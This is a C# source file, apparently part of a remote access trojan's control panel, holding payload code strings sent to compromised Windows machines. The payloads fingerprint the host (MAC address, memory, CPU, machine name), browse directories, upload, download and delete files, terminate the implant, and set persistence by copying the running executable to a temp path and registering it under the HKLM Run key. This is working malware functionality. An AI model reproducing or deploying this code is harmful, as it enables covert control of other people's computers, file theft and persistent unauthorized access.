using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Panel
{
    class Payload
    {
        public const string PAYLOAD_ECHO = @"public static byte[] execute(){ 
            string outID = null;
            ManagementObjectSearcher query1;
            ManagementObjectCollection queryCollection1;
            query1 = new ManagementObjectSearcher(""SELECT * FROM Win32_NetworkAdapter"");
            queryCollection1 = query1.Get();
            foreach (ManagementObject mo in queryCollection1){
                if (mo[""MACAddress""] != null) outID = mo[""MACAddress""].ToString().Replace("":"", """");  
            }

            double totalCapacity = 0;
            ObjectQuery objectQuery = new ObjectQuery(""select * from Win32_PhysicalMemory"");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(objectQuery);
            ManagementObjectCollection vals = searcher.Get();
            foreach (ManagementObject val in vals){
                totalCapacity += System.Convert.ToDouble(val.GetPropertyValue(""Capacity""));
			}

            string pays = null;
            foreach (CultureInfo ci in CultureInfo.GetCultures(CultureTypes.SpecificCultures))
            {
                        var ri = new RegionInfo(ci.Name);
                        pays = ri.DisplayName;
            }

            string infoOut = null;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(""SELECT maxclockspeed,  datawidth, name, manufacturer FROM Win32_Processor"");
            ManagementObjectCollection objCol = searcher.Get();
            foreach (ManagementObject mgtObject in objCol)
            {
                infoOut = (Convert.ToDecimal(mgtObject[""maxclockspeed""]) / 1000).ToString() + ""GHz "";
                infoOut += mgtObject[""datawidth""].ToString() + ""bit "";
                infoOut += mgtObject[""name""].ToString();
            }

            string rps = outID + ""|"" + pays + ""|"" + Environment.MachineName + ""|"" + (totalCapacity/1024/1024).ToString() + ""|"" + infoOut;
            return System.Text.ASCIIEncoding.ASCII.GetBytes(rps); }";

        public const string PAYLOAD_LIST_DIR = @"public static byte[] execute(){ 
			string[] array1 = System.IO.Directory.GetDirectories(""."");
			System.Text.StringBuilder sb = new System.Text.StringBuilder();
			foreach (string name in array1){ 
				sb.Append(name + ""\n"");
			}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(sb.ToString());
		}";

        public const string PAYLOAD_PWD = @"public static byte[] execute(){
			return System.Text.ASCIIEncoding.ASCII.GetBytes(System.IO.Directory.GetCurrentDirectory());
		}";

        public const string PAYLOAD_CD = @"public static byte[] execute(){{
			string dir = ""{0}"";
			System.IO.Directory.SetCurrentDirectory(dir);
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""Directory changed to "" + dir);
		}}";

        public const string PAYLOAD_UPLOAD = @"public static byte[] execute(){{
			System.IO.File.WriteAllBytes(""{0}"", Convert.FromBase64String(""{1}""));
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""File {0} successfully created."");
		}}";

        public const string PAYLOAD_DOWNLOAD = @"public static byte[] execute(){{
			return System.IO.File.ReadAllBytes(""{0}"");
		}}";

        public const string PAYLOAD_DELETE = @"public static byte[] execute(){{
			System.IO.File.Delete(""{0}"");
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""File {0} deleted"");
		}}";

        public const string PAYLOAD_LS = @"public static byte[] execute(){
			string[] array1 = System.IO.Directory.GetFiles(""."");
			System.Text.StringBuilder sb = new System.Text.StringBuilder();
			foreach (string name in array1){ 
				sb.Append(name + ""\n"");
			}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(sb.ToString());
		}";

        public const string PAYLOAD_TERMINATE = @"public static byte[] execute(){
			System.Environment.Exit(0);
			return System.Text.ASCIIEncoding.ASCII.GetBytes("""");
		}";

        public const string PAYLOAD_PERSIST = @"public static byte[] execute(){{
			string path = System.IO.Path.GetTempFileName() + "".exe"";
			System.IO.File.Copy(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, path);
			string runKey = ""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"";
			Microsoft.Win32.RegistryKey startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey);
			if (startupKey.GetValue(""{0}"") == null){{
				startupKey.Close();
				startupKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(runKey, true);
				startupKey.SetValue(""{0}"", path);
				startupKey.Close();
			}}
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""Key {0} created"");
		}}";

        public const string PAYLOAD_EXIT = @"public static byte[] execute(){
			return System.Text.ASCIIEncoding.ASCII.GetBytes(""Quitté -->"" + Environment.MachineName + "" By QuadCore"");
		}";

    }
}
